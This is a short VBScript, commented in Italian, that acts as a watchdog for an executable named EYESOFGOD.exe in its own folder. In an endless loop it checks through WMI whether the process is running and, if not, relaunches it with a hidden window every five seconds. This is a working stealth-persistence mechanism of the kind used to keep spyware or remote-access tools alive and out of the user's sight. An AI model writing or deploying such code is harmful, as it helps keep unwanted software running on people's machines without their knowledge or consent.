' Oggetti base di Windows
Set shell = CreateObject("WScript.Shell")
Set fso   = CreateObject("Scripting.FileSystemObject")

' Percorso del EXE
scriptDir = fso.GetParentFolderName(WScript.ScriptFullName)
exePath = scriptDir & "\EYESOFGOD.exe"

' Funzione per controllare se un processo è in esecuzione
Function IsRunning(processName)
    Dim wmi, processes, p
    Set wmi = GetObject("winmgmts:\\.\root\cimv2")
    Set processes = wmi.ExecQuery("Select * from Win32_Process where Name='" & processName & "'")
    IsRunning = (processes.Count > 0)
End Function

' Loop infinito
Do
    ' Se l'EXE non esiste, esce
    If Not fso.FileExists(exePath) Then
        WScript.Quit
    End If

    ' Controlla se EYESOFGOD.exe è in esecuzione
    If Not IsRunning("EYESOFGOD.exe") Then
        ' Avvia l'EXE invisibile
        shell.Run """" & exePath & """", 0, False
    End If

    ' Attendi 5 secondi prima del prossimo controllo
    WScript.Sleep 5000
Loop
